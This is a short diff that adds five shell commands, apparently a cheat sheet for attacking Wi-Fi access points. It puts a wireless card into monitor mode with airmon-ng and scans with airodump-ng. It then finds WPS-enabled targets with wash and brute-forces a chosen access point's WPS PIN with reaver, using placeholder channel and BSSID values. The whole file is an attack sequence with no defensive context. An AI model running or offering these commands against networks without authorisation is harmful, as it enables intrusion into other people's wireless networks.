@@ -1,0 +1,5 @@
+airmon-ng
+airmon-ng stop wlan0
+airodump-ng wlan0
+wash -i wlan0 -c <CH> -C -s
+reaver -i wlan0 -b <BSSID> --fail-wait=360
